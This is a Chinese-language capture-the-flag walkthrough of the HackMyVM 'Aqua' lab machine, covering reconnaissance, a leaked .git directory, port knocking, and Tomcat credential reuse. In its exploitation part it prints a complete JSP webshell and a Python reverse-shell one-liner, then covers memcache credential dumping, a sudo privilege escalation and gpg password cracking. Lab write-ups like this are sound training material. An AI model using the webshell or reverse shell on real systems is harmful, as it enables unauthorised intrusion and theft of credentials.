@@ -1,0 +1,451 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BprUyzl25TMRrSH1M7-O0g)
+
+ ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 70篇原创内容   公众号
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvGXA2gs6jZxdBVyosFEIJ0XFRbBoR73dpeQhsGrGcN8WAFgXBYibqzQtW5hFF88evuDD7lLicsF9Uw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+=========================================================================================================================================================================
+
+靶机信息
+----
+
+下载地址:
+
+```
+`https://hackmyvm.eu/machines/machine.php?vm=Aqua``网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r`
+```
+
+靶场: HackMyVm.eu  
+
+靶机名称: Aqua
+
+难度: 中级
+
+发布时间: 2022年3月18日
+
+提示信息:
+
+```
+无
+```
+
+目标: user.txt和root.txt
+
+  
+
+实验环境
+----
+
+```
+攻击机:VMware kali 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only  
+  
+靶机:Vbox linux IP自动获取 网卡host-Only
+```
+
+  
+
+信息收集
+----
+
+### 扫描主机
+
+扫描局域网内的靶机IP地址
+
+```
+sudo nmap -sP 10.0.0.1/24
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到主机地址为10.0.0.117
+
+### 扫描端口
+
+扫描靶机开放的服务端口
+
+```
+sudo nmap -sC -sV -p- 10.0.0.117 -oN nmap.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到开放多个端口，其中21端口被防火墙过滤，先来看看80端口
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+一个简单的页面，内容没看懂，先来做个目录扫描
+
+```
+gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.0.0.117 -x php,txt,html,zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现robots.txt，查看有哪些敏感信息
+
+```
+curl http://10.0.0.117/robots.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现SuperCMS目录，继续访问
+
+```
+http://10.0.0.117/SuperCMS/
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+在源码的右下角发现一段base64字符串，
+
+```
+echo 'MT0yID0gcGFzc3dvcmRfemlwCg==' | base64 -d
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+得到内容“1=2 = password_zip”，访问80端口根目录时有显示1和2
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+猜测应该是这样agua=H2O = password_zip，继续做个目录扫描。
+
+```
+gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/big.txt  -u http://10.0.0.117/SuperCMS -x php,txt,html
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现.git目录，使用git_dumper获取内容并保存到10.0.0.117目录下
+
+.git目录泄露利用  
+
+```
+python3 git_dumper.py http://10.0.0.117/SuperCMS/.git/ 10.0.0.117
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+进入10.0.0.117目录下查看git日志
+
+```
+cd 10.0.0.117  
+git log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+日志中发现备注中有疑似端口敲门文件，看一下详细日志
+
+```
+git diff 58afe63a1cd28fa167b95bcff50d2f6f011337c1
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+找到文件名，将文件导出来
+
+```
+git show $(git rev-list --max-count=1 --all -- knocking_on_Atlantis_door.txt)^:knocking_on_Atlantis_door.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+在之前的nmap扫描中只有21端口是被防火墙过滤的，现在使用端口敲门访问1100 800 666 三个端口后再来检查21端口是否开放
+
+端口敲门
+
+```
+knock 10.0.0.117 1100 800 666 -v
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+```
+nmap 10.0.0.117 -sC -sV -p21
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+端口开放了，并且可以匿名访问
+
+```
+ftp 10.0.0.117  
+输入用户名anonymous  
+密码为空  
+ls  
+cd pub  
+ls -al  
+get .backup.zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现个隐藏文件.backup.zip解压看看内容
+
+```
+unzip .backup.zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提示需要编译器，百度后说要用7za
+
+```
+7za x .backup.zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+需要密码，之前拿到的aqua=H2O应该就是密码了，经过几次手动测试密码为H2O
+
+```
+7za x .backup.zip -aoa -pagua=H2O  
+ls
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+查看tomcat-users.xml内容找到tomcat管理员帐号密码
+
+```
+cat tomcat-users.xml
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登陆tomcat的管理页面
+
+```
+http://10.0.0.117:8080
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登陆成功，上传webshell
+
+1。准备jsp的webshell，密码为passwd(蚁剑可用)
+
+```
+<%!  
+    class U extends ClassLoader {  
+        U(ClassLoader c) {  
+            super(c);  
+        }  
+        public Class g(byte[] b) {  
+            return super.defineClass(b, 0, b.length);  
+        }  
+    }  
+   
+    public byte[] base64Decode(String str) throws Exception {  
+        try {  
+            Class clazz = Class.forName("sun.misc.BASE64Decoder");  
+            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);  
+        } catch (Exception e) {  
+            Class clazz = Class.forName("java.util.Base64");  
+            Object decoder = clazz.getMethod("getDecoder").invoke(null);  
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);  
+        }  
+    }  
+%>  
+<%  
+    String cls = request.getParameter("passwd");  
+    if (cls != null) {  
+        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);  
+    }  
+%>
+```
+
+2。将webshell.jsp打包为zip，再修改扩展名为war
+
+```
+zip webshell webshell.jsp  
+mv webshell.zip webshell.war
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+3。上传webshell
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+上传成功，使用蚁剑连接
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+由于个人用不习惯蚁剑的shell，反弹shell到攻击机
+
+1。攻击机监听4444端口
+
+```
+nc -lvvp 4444
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。使用蚁剑的shell反向连接到攻击机，或用插件反向连接shell
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+反弹成功，找找提权信息
+
+```
+cat /etc/passwd
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现一个可登录的用户，继续找
+
+```
+netstat -ntlp
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现memcache服务，进去看看
+
+```
+telnet 127.0.0.1 11211
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+连接成功，找找有没有可利用的信息
+
+```
+stats items
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+item1里有5个key，查看5个key的名字
+
+```
+stats cachedump 1 5
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+查询到5个key分别为id、email、name、password、username，再来检查key的值
+
+```
+get username  
+get password
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+用户名为tridente，密码为N3ptun0D10sd3lM4r$，这个用户名与可登录的用户名相同，SSH登录试试
+
+```
+ssh tridente@10.0.0.117
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录成功，查找敏感信息
+
+```
+ls  
+cat user.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到user.txt，继续 找
+
+```
+sudo -l
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+可以使用root权限执行tridente用户目录下的find
+
+```
+ls -al
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+这是tridente自己的程序可以随便修改内容，直接用bash替换
+
+```
+cp -rf /bin/bash ~/find
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到root权限，再来找下flag
+
+```
+cd /root  
+ls  
+file root.txt.gpg
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+root.txt被加密了，使用gpg2john破解密码
+
+gpg密码暴破
+
+1。将root.txt.gpg下载到攻击机
+
+靶机：
+
+```
+python3 -m http.server
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+攻击机：
+
+```
+wget http://10.0.0.117:8000/root.txt.gpg
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。使用gpg2john生成hash密码
+
+```
+gpg2john root.txt.gpg >gpghash
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+3。john暴破密码
+
+```
+john gpghash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到密码arthur，使用gpg解出flag
+
+```
+echo "arthur" | gpg --batch --passphrase-fd 0 --output root.txt --decrypt root.txt.gpg  
+cat root.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到root.txt，游戏结束。
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
